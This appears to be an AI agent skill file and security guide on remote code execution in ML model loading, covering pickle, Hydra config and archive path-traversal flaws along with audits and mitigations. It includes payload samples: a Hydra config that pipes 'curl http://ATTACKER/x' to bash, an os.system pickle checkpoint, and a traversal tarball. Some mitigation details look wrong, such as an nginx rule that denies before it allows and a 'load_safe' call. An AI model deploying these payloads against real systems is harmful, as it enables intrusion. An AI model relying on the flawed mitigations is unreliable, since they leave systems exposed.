---
name: ai-models-rce
description: Security skill for understanding and testing RCE vulnerabilities in AI/ML model loading. Use this skill whenever the user mentions machine learning models, model deserialization, PyTorch, TensorFlow, Keras, ONNX, or any ML framework loading. Also trigger when discussing model security, pickle vulnerabilities, CVE-2024-12029, CVE-2025-23298, or any AI/ML security audit. This skill helps create educational test payloads, audit vulnerable code, and implement mitigations for model loading RCE attacks.
---

# AI/ML Model RCE Security

A comprehensive guide to understanding, testing, and mitigating Remote Code Execution vulnerabilities in machine learning model loading systems.

## Overview

Machine Learning models are commonly shared in formats like ONNX, TensorFlow, PyTorch, etc. These models can be loaded into developer machines or production systems. While models shouldn't contain malicious code, vulnerabilities in model loading libraries can lead to arbitrary code execution.

**⚠️ IMPORTANT**: This skill is for **defensive security testing and education only**. Only test systems you own or have explicit authorization to audit.

## Vulnerability Classes

### 1. Pickle Deserialization RCE

Python's `pickle` module executes arbitrary code during deserialization. Many ML frameworks use pickle internally:

| Framework | CVE | Vector |
|-----------|-----|--------|
| PyTorch `torch.load` | CVE-2025-32434 | Malicious pickle in checkpoint |
| Scikit-learn `joblib.load` | CVE-2020-13092 | Pickle with `__reduce__` payload |
| NumPy `np.load` | CVE-2019-6446 | Pickled object arrays (disputed) |
| TensorFlow/Keras | CVE-2021-37678 | Unsafe YAML loading |

### 2. Hydra Metadata RCE

`hydra.utils.instantiate()` imports and calls any dotted `_target_` in configuration objects. Works even with "safe" formats like `.safetensors`:

```yaml
_target_: builtins.exec
_args_:
  - "import os; os.system('curl http://ATTACKER/x|bash')"
```

**Affected**: NeMo, uni2TS, FlexTok (CVE-2025-23304, CVE-2026-22584)

### 3. Path Traversal via Archive Models

Many model formats are archives (`.zip`, `.tar.gz`). Path traversal can read/write arbitrary files:

- ONNX Runtime: CVE-2022-25882, CVE-2024-5187
- NVIDIA Triton Server: CVE-2023-31036

### 4. Framework-Specific RCE

| Framework | CVE | Details |
|-----------|-----|--------|
| InvokeAI | CVE-2024-12029 | `/api/v2/models/install` endpoint |
| NVIDIA Merlin | CVE-2025-23298 | Unsafe `torch.load` in checkpoint loader |
| TensorFlow/Keras | CVE-2024-3660 | Lambda layer arbitrary code |
| GGML/GGUF | CVE-2024-25664-25668 | Heap overflows in parser |
| Tencent DSFD | CVE-2025-13715 | Resnet endpoint deserialization |

## Creating Educational Test Payloads

### PyTorch Malicious Checkpoint

Use `scripts/generate-pytorch-payload.py` to create a test payload:

```bash
python scripts/generate-pytorch-payload.py --output test_payload.ckpt --command "echo 'test' > /tmp/test.txt"
```

**Manual example** (for understanding):

```python
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

malicious_state = {"fc.weight": MaliciousPayload()}
torch.save(malicious_state, "malicious_state.pth")
```

### Keras Lambda Layer Payload

Use `scripts/generate-keras-payload.py` for Keras models with Lambda layers.

### Path Traversal Model

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

## Auditing Your Systems

### 1. Check for Vulnerable Code Patterns

Use `scripts/check-vulnerable-versions.py` to scan your codebase:

```bash
python scripts/check-vulnerable-versions.py --path /path/to/codebase
```

**Look for**:
- `torch.load()` without `weights_only=True`
- `pickle.load()` on untrusted data
- `joblib.load()` without validation
- `hydra.utils.instantiate()` with untrusted config
- `yaml.unsafe_load()` or `yaml.load()` with Loader

### 2. Version Checks

| Framework | Vulnerable Versions | Safe Versions |
|-----------|-------------------|---------------|
| InvokeAI | 5.3.1 - 5.4.2 | ≥ 5.4.3 |
| NVIDIA Merlin | Pre-PR #802 | Post-PR #802 |
| PyTorch | All (use weights_only) | All (with mitigation) |

### 3. Network Exposure Audit

Check if model loading endpoints are exposed:

```bash
# Check for exposed model endpoints
curl -X POST http://target:9090/api/v2/models/install -v

# Check Triton model-load API
curl http://target:8000/v2/repository/index
```

## Mitigations

### 1. PyTorch Safe Loading

```python
# ✅ Safe - use weights_only
torch.load("model.pth", weights_only=True)

# ✅ Safe - use torch.load_safe (newer PyTorch)
from torch.serialization import load_safe
model = load_safe("model.pth")

# ❌ Unsafe
torch.load("model.pth")  # pickle deserialization!
```

### 2. Model Format Selection

**Prefer non-executable formats**:
- Safetensors (Hugging Face)
- ONNX (with validation)
- SavedModel (TensorFlow)

**Avoid pickle-based formats** when possible:
- `.pt`, `.pth`, `.pkl`, `.ckpt` (PyTorch)
- `.h5` (older Keras)

### 3. Input Validation

```python
# Validate model source before loading
ALLOWED_SOURCES = ["huggingface.co", "internal-repo.company.com"]

def safe_load_model(url):
    if not any(url.startswith(src) for src in ALLOWED_SOURCES):
        raise ValueError(f"Untrusted model source: {url}")
    # Additional validation...
```

### 4. Network Controls

```nginx
# Block direct Internet access to model endpoints
location /api/v2/models/install {
    deny all;
    allow 10.0.0.0/8;  # Internal CI only
}
```

### 5. Sandboxing

- Run ML services as non-root
- Use seccomp/AppArmor profiles
- Restrict filesystem access
- Block network egress during model loading
- Monitor for unexpected child processes

### 6. Model Provenance

- Sign models with cryptographic signatures
- Verify signatures before loading
- Maintain allow-lists of trusted sources
- Use artifact registries with integrity checks

## Testing Checklist

Before deploying ML model loading:

- [ ] All `torch.load()` calls use `weights_only=True` or `load_safe()`
- [ ] No `pickle.load()` on untrusted data
- [ ] Model sources are validated/allow-listed
- [ ] Endpoints are not exposed to untrusted networks
- [ ] Service runs with least privilege
- [ ] Model signatures are verified
- [ ] Monitoring is in place for anomalous processes
- [ ] Dependencies are up-to-date

## References

- [PyTorch Serialization Security](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [InvokeAI CVE-2024-12029](https://www.offsec.com/blog/cve-2024-12029/)
- [NVIDIA Merlin CVE-2025-23298](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298)
- [Unit 42 AI/ML RCE Report](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [Hydra Instantiate Security](https://hydra.cc/docs/advanced/instantiate_objects/overview/)

## Quick Commands

```bash
# Generate test payload
python scripts/generate-pytorch-payload.py --output test.ckpt

# Audit codebase
python scripts/check-vulnerable-versions.py --path ./src

# Check vulnerable versions
python scripts/check-vulnerable-versions.py --check-deps requirements.txt
```

## When to Use This Skill

Use this skill when:
- Auditing ML model loading code for security vulnerabilities
- Creating educational test payloads for security training
- Investigating RCE vulnerabilities in AI/ML systems
- Implementing secure model loading practices
- Responding to CVEs related to model deserialization
- Designing secure ML infrastructure
- Reviewing third-party ML libraries for security issues
